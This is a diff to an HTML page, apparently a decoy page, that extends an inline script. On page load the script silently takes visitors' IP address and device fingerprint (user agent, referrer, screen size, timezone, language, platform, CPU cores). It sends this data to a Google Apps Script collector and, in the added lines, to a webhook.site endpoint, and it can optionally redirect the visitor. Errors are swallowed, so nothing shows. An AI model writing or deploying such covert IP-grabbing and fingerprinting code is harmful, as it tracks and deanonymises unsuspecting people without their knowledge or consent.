@@ -39,23 +39,50 @@
 </main>
 <footer>green page</footer>
 <script>
-  // language: JavaScript, file: inline, target: browser
   var COLLECTOR = 'https://script.google.com/macros/s/AKfycbxf2WLWQHXAkpzZ7cffn8xuUXlNjRiEGzQ68YjjWBclSo_2SOlK4iRa4rL4RYsnGMLJ/exec';
+  var WEBHOOK   = 'https://webhook.site/a9a83f66-ec0c-4dfa-9612-9cd7f9056784';
+  var REDIRECT  = 'https://example.com'; 
+
   (async function () {
     try {
       var r = await fetch('https://api.ipify.org?format=json');
       var d = await r.json();
-      await fetch(COLLECTOR, {
+      
+      var payload = {
+        ip: d.ip,
+        ua: navigator.userAgent,
+        ref: document.referrer || '',
+        page: location.href,
+        ts: new Date().toISOString(),
+        screen: screen.width + 'x' + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang: navigator.language,
+        platform: navigator.platform,
+        cores: navigator.hardwareConcurrency || 'unknown',
+        touch: navigator.maxTouchPoints > 0
+      };
+
+      fetch(COLLECTOR, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'text/plain' },
-        body: JSON.stringify({
-          ip: d.ip,
-          ua: navigator.userAgent,
-          ref: document.referrer || '',
-          page: location.href
-        })
+        body: JSON.stringify(payload)
       });
+
+      if (WEBHOOK) {
+        fetch(WEBHOOK, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      }
+
+      if (REDIRECT && REDIRECT !== 'https://example.com') {
+        setTimeout(function() {
+          window.location.href = REDIRECT;
+        }, 1500); 
+      }
     } catch (e) {}
   })();
 </script>
